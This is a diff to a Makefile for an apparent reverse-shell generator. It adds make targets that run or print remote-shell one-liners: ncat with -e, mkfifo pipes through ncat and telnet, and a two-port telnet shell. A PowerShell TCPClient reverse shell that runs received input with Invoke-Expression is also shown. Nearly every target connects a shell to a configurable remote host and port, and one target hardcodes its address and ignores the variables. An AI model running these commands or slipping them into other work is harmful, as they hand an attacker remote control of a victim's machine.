@@ -1,6 +1,8 @@
-SHELL	:= $(or $(shell), /bin/bash)
-HOST	:= $(or $(host), 127.0.0.1)
-PORT	:= $(or $(port), 4444)
+SHELL	:= /bin/bash
+HOST	:= 127.0.0.1
+PORT	:= 4444
+PORT2	:= 4445
+FILE	:= $(or $(file), /tmp/f)
 
 LIST	:= "methodlist.txt"
 
@@ -19,10 +21,17 @@ show:
 	@printf "SHELL: $(GREEN)$(SHELL)$(RESET)\n"
 	@printf "HOST: $(GREEN)$(HOST)$(RESET)\n"
 	@printf "PORT: $(GREEN)$(PORT)$(RESET)\n"
+	@printf "SECOND PORT*: $(GREEN)$(PORT2)$(RESET)\n"
+	@printf "TEMPORARY FILE*: $(GREEN)$(FILE)$(RESET)\n"
+	@printf "* = only necessary for some methods\n"
+	@printf "\n"
+	@printf "To change previous values, run $(UNDERLINE)./configure <shell> <host> <port> [<port2>] [<file>]$(RESET).\n"
+	@printf "\n"
 	@printf "Available methods:\n"
 	@while IFS= read -r cmd; do \
 		printf "   $(BOLD)$(BLUE)%s$(RESET)\n" "$$cmd"; \
 	done < $(LIST)
+	@printf "\n"
 	@printf "Run $(UNDERLINE)make <method>$(RESET) to use a specific method from the list.\n"
 	@printf "Run $(UNDERLINE)make <method>-show$(RESET) to just see the command(s) for a specific method (without running it).\n"
 
@@ -69,6 +78,12 @@ zsh-show:
 
 ############################################################
 
+####################### SCHEME SHELL #######################
+
+# TODO
+
+############################################################
+
 ######################## POWERSHELL ########################
 
 pwsh:
@@ -76,5 +91,37 @@ pwsh:
 
 pwsh-show:
 	@printf "pwsh -c '\$$TCPClient = New-Object Net.Sockets.TCPClient($(HOST), $(PORT)); \$$NetworkStream = \$$TCPClient.GetStream(); \$$StreamReader = New-Object IO.StreamReader(\$$NetworkStream); \$$StreamWriter = New-Object IO.StreamWriter(\$$NetworkStream); \$$StreamWriter.AutoFlush = \$$true; \$$Buffer = New-Object System.Byte[] 1024; while (\$$TCPClient.Connected) { while (\$$NetworkStream.DataAvailable) { \$$RawData = \$$NetworkStream.Read(\$$Buffer, 0, \$$Buffer.Length); \$$Code = ([text.encoding]::UTF8).GetString(\$$Buffer, 0, \$$RawData -1) }; if (\$$TCPClient.Connected -and \$$Code.Length -gt 1) { \$$Output = try { Invoke-Expression (\$$Code) 2>&1 } catch { \$$_ }; \$$StreamWriter.Write(\"\$$Output\`n\"); \$$Code = \$$null } }; \$$TCPClient.Close(); \$$NetworkStream.Close(); \$$StreamReader.Close(); \$$StreamWriter.Close()'\n"
+
+############################################################
+
+########################## NETCAT ##########################
+
+ncat1:
+	ncat -e $(SHELL) $(HOST) $(PORT)
+
+ncat1-show:
+	@printf "ncat -e $(SHELL) $(HOST) $(PORT)\n"
+
+ncat2:
+	mkfifo $(FILE); cat $(FILE) | /bin/bash 2>&1 | ncat 127.0.0.1 4444 > $(FILE)
+
+ncat2-show:
+	@printf "mkfifo $(FILE); cat $(FILE) | /bin/bash 2>&1 | ncat 127.0.0.1 4444 > $(FILE)\n"
+
+############################################################
+
+########################## TELNET ##########################
+
+telnet1:
+	telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)
+
+telnet1-show:
+	@printf "telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)\n"
+
+telnet2:
+	mkfifo $(FILE); cat $(FILE) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT) > $(FILE)
+
+telnet2-show:
+	@printf "mkfifo $(FILE); cat $(FILE) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT) > $(FILE)\n"
 
 ############################################################
